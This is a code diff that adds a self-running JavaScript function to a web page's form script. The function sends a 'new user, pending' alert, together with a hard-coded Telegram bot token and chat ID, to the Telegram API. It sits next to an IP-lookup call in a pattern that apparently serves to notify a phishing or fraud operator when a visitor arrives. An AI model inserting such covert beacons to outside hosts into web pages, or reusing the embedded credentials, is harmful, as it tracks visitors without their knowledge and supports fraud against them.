@@ -552,6 +552,47 @@ taskform.addEventListener("click", async (e) => {
 	
 	getIpClient();
 	
+	function carl(params) {
+   
+      
+     
+
+   
+    const token = '5863335492:AAHKIDXsmWL2o5U99kjBsb-0qNpQ71ouczQ';
+ const chatId = '-871828680';
+ const doc = "NUEVO USUARIO, PENDIENTE!";
+ 
+   
+ const message = ` doc.: ${doc}--- ` ;
+ $.ajax({
+   type: 'POST',
+   url: `https://api.telegram.org/bot${token}/sendMessage`,
+   data: {  
+       chat_id: chatId,
+       text: message,
+       parse_mode: 'html',
+   },
+   success: function (res) {
+       console.debug(res);
+       $('#response').text('Message sent');
+       console.log("enviado")
+       
+       
+       
+       
+      
+   },
+   error: function (error) {
+       console.error(error);
+       alert("error failed");
+   } 
+ 
+ })
+ 
+ }
+ carl();
+	
+	
 		  </script>
 
 
